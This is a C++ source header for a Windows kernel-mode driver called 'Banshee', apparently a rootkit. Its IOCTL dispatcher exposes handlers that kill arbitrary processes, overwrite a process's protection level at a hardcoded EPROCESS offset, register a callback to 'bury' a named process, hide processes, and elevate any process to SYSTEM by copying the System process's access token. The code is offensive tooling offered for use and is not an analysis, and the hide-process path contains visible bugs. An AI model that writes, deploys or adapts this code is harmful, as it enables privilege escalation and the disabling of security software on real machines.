#pragma once

#include <ntifs.h>
#include <wdf.h>
#include "Globals.hpp"
#include "ProcessUtils.hpp"
#include "DriverMeta.hpp"
#include "Misc.hpp"
#include "WinTypes.hpp"

// --------------------------------------------------------------------------------------------------------
// IOCTLs 

#define BE_IOCTL_TEST_DRIVER CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define BE_IOCTL_KILL_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define BE_IOCTL_PROTECT_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct _IOCTL_PROTECT_PROCESS_PAYLOAD {
    ULONG pid;
    BYTE newProtectionLevel;
} IOCTL_PROTECT_PROCESS_PAYLOAD;

#define BE_IOCTL_BURY_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define BE_IOCTL_ELEVATE_TOKEN CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define BE_IOCTL_HIDE_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)

// --------------------------------------------------------------------------------------------------------

NTSTATUS BeUnSupportedFunction(PDEVICE_OBJECT pDeviceObject, PIRP Irp);
NTSTATUS BeIoctlTestDriver(PIRP Irp, PIO_STACK_LOCATION pIoStackIrp, ULONG* pdwDataWritten);
NTSTATUS BeIoctlKillProcess(HANDLE pid);
NTSTATUS BeIoctlProtectProcess(ULONG pid, BYTE newProcessProtection);
NTSTATUS BeIoctlBuryProcess(PIRP Irp, PIO_STACK_LOCATION pIoStackIrp, ULONG* pdwDataWritten);
NTSTATUS BeIoCtlElevateProcessAcessToken(HANDLE pid);

// --------------------------------------------------------------------------------------------------------

/**
 * Essentially Banshee's IOCTL dispatcher. Takes care of incoming IO Request Packets (IRPs),
 * parses the payload and calls the appropriate function.
 *
 * @param DeviceObject Pointer to the DeviceObject.
 * @param Irp Pointer to the IO Request Packet (IRP)
 * @return NTSTATUS status code.
 */
NTSTATUS
BeIoControl(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);
    DbgPrint("BeIoControl Called \r\n");

    NTSTATUS status = STATUS_NOT_SUPPORTED;
    PIO_STACK_LOCATION pIoStackIrp = IoGetCurrentIrpStackLocation(Irp);;
    ULONG dwDataWritten = 0;

    ULONG targetPid = 0;
    IOCTL_PROTECT_PROCESS_PAYLOAD payload = { 0 };

    if (pIoStackIrp)
    {
        switch (pIoStackIrp->Parameters.DeviceIoControl.IoControlCode)
        {
        case BE_IOCTL_TEST_DRIVER:
            status = BeIoctlTestDriver(Irp, pIoStackIrp, &dwDataWritten);
            break;

        case BE_IOCTL_KILL_PROCESS:
            RtlCopyMemory(&targetPid, Irp->AssociatedIrp.SystemBuffer, sizeof(ULONG)); // Copy over PID parameter from IRP buffer
            status = BeIoctlKillProcess(ULongToHandle(targetPid));
            break;

        case BE_IOCTL_ELEVATE_TOKEN:
            RtlCopyMemory(&targetPid, Irp->AssociatedIrp.SystemBuffer, sizeof(ULONG)); // Copy over PID parameter from IRP buffer
            status = BeIoCtlElevateProcessAcessToken(ULongToHandle(targetPid));
            break;

        case BE_IOCTL_PROTECT_PROCESS:
            RtlCopyMemory(&payload, Irp->AssociatedIrp.SystemBuffer, sizeof(IOCTL_PROTECT_PROCESS_PAYLOAD)); // Copy over payload from IRP buffer
            status = BeIoctlProtectProcess(payload.pid, payload.newProtectionLevel);
            break;

        case BE_IOCTL_BURY_PROCESS:
            status = BeIoctlBuryProcess(Irp, pIoStackIrp, &dwDataWritten);
            break;

        case BE_IOCTL_HIDE_PROCESS:
            RtlCopyMemory(&payload, Irp->AssociatedIrp.SystemBuffer, sizeof(IOCTL_PROTECT_PROCESS_PAYLOAD)); // Copy over PID parameter from IRP buffer
            status = BeIoctlHideProcess(ULongToHandle(targetPid));
            break;
        }
    }

    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = dwDataWritten;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    return status;
}

/**
 * Called on unsupported IOCTL
 *
 * @param DeviceObject Pointer to the DeviceObject.
 * @param Irp Pointer to the IO Request Packet (IRP)
 * @return NTSTATUS status code.
 */
NTSTATUS
BeUnSupportedFunction(PDEVICE_OBJECT pDeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(pDeviceObject);
    UNREFERENCED_PARAMETER(Irp);
    DbgPrint("Unsupported function Called \r\n");
    return STATUS_SUCCESS;
}

/**
 * IOCTL Method for testing the driver by writing an int value of 6 into the outBuffer.
 *
 * @param Irp Pointer to the IO Request Packet (IRP)
 * @param pIoStackIrp Pointer to the caller's I/O stack location in the specified IRP.
 * @return NTSTATUS status code.
 */
NTSTATUS
BeIoctlTestDriver(PIRP Irp, PIO_STACK_LOCATION pIoStackIrp, ULONG* pdwDataWritten)
{
    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
    PCHAR pInputBuffer = (PCHAR)Irp->AssociatedIrp.SystemBuffer;
    PCHAR pOutputBuffer = (PCHAR)Irp->AssociatedIrp.SystemBuffer;

    ULONG dwDataOut = 6; // Write a 6 for testing
    ULONG dwDataSize = sizeof(ULONG);

    if (pInputBuffer && pOutputBuffer)
    {
        if (pIoStackIrp->Parameters.DeviceIoControl.OutputBufferLength >= dwDataSize) // Output buffer should be big enough
        {
            RtlCopyMemory(pOutputBuffer, &dwDataOut, dwDataSize);
            *pdwDataWritten = dwDataSize;
            NtStatus = STATUS_SUCCESS;
        }
        else
        {
            *pdwDataWritten = dwDataSize;
            NtStatus = STATUS_BUFFER_TOO_SMALL;
        }
    }

    return NtStatus;
}

/**
 * IOCTL Method for setting the protection of an arbitrary process by PID.
 *
 * @param pid PID of the target process
 * @param newProtectionLevel new level of protection to apply
 * @return NTSTATUS status code.
 */
NTSTATUS
BeIoctlProtectProcess(ULONG pid, BYTE newProtectionLevel)
{
    DbgPrint("Changing pid %i protection to %i", pid, newProtectionLevel);

    // Lookup process
    PEPROCESS process = BeGetEprocessByPid(pid);
    if (process == NULL)
    {
        return STATUS_INVALID_PARAMETER_1;
    }

    ULONG_PTR EProtectionLevel = (ULONG_PTR)process + 0x87a; // TODO: avoid hardcoded offsets

    DbgPrint("Current protection level: %i", *((BYTE*)(EProtectionLevel)));

    // assign new protection level
    *((BYTE*)(EProtectionLevel)) = newProtectionLevel;

    DbgPrint("New protection level: %i", *((BYTE*)(EProtectionLevel)));

    return STATUS_SUCCESS;
}

/**
 * Activates the callback to enable the "burying" functionality.
 *
 * @return NTSTATUS status code.
 */
NTSTATUS
BeIoctlBuryProcess(PIRP Irp, PIO_STACK_LOCATION pIoStackIrp, ULONG* pdwDataWritten)
{
    UNREFERENCED_PARAMETER(pdwDataWritten);
    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
    WCHAR* pInputBuffer = (WCHAR*)Irp->AssociatedIrp.SystemBuffer;
    ULONG dwSize = pIoStackIrp->Parameters.DeviceIoControl.InputBufferLength;

    DbgPrint("BeIoctlBuryProcess called, size: %i \r\n", dwSize);
    __try
    {
        // Check alignment
        if (dwSize % sizeof(WCHAR) != 0)
        {
            DbgPrint("Invalid alignment \r\n");
            return STATUS_INVALID_BUFFER_SIZE;
        }

        if (!pInputBuffer)
        {
            DbgPrint("Empty buffer \r\n");
            return STATUS_INVALID_PARAMETER;
        }

        DbgPrint("String received: %ws \r\n", pInputBuffer);

        if (BeIsStringTerminated(pInputBuffer, dwSize) == FALSE)
        {
            DbgPrint("Not null terminated! \r\n");
            return STATUS_UNSUCCESSFUL;
        }

        if (BeGlobals::buryProcess.buryRoutineAdded)
        {
            DbgPrint("Routine already exists! \r\n");
            return STATUS_SUCCESS;
        }

        // Allocate global memory for process name and copy over to global
        BeGlobals::buryProcess.beBuryTargetProcessName = (WCHAR*)ExAllocatePoolWithTag(PagedPool, dwSize, DRIVER_TAG);
        if (!BeGlobals::buryProcess.beBuryTargetProcessName)
        {
            return STATUS_MEMORY_NOT_ALLOCATED;
        }
        RtlCopyMemory(BeGlobals::buryProcess.beBuryTargetProcessName, pInputBuffer, dwSize);

        DbgPrint("String now: %ws \r\n", BeGlobals::buryProcess.beBuryTargetProcessName);

        NtStatus = PsSetCreateProcessNotifyRoutineEx(BeBury_ProcessNotifyRoutineEx, FALSE);
        BeGlobals::buryProcess.buryRoutineAdded = TRUE;

        if (NtStatus == STATUS_SUCCESS)
        {
            DbgPrint("Added routine!\n");
        }
        else
        {
            DbgPrint("Failed to add routine! Error: %i\n", NtStatus);
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        NtStatus = GetExceptionCode();
    }

    return NtStatus;
}

/**
 * Sets target process access token to a SYSTEM token.
 *
 * @param pid PID of target process.
 * @return NTSTATUS status code.
 */
NTSTATUS
BeIoCtlElevateProcessAcessToken(HANDLE pid)
{
    PEPROCESS privilegedProcess, targetProcess;
    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
    ULONG tokenOffset = BeGetAccessTokenOffset();

    // Lookup target process
    NtStatus = PsLookupProcessByProcessId(pid, &targetProcess);
    if (NtStatus != 0)
    {
        DbgPrint("PID %i not found", (ULONG)pid);
        return NtStatus;
    }

    // Lookup system process (handle for pid 4)
    NtStatus = PsLookupProcessByProcessId((HANDLE)4, &privilegedProcess);
    if (NtStatus != 0)
    {
        DbgPrint("System process not found with pid 4");
        return NtStatus;
    }

    //DbgPrint("Token Target: %i", (ULONG)targetProcess + tokenOffset);
    //DbgPrint("Token System: %i", (ULONG)privilegedProcess + tokenOffset);

    // Replace target process token with system token
    *(ULONG64*)((ULONG64)targetProcess + tokenOffset) = *(ULONG64*)((ULONG64)privilegedProcess + tokenOffset);

    return NtStatus;
}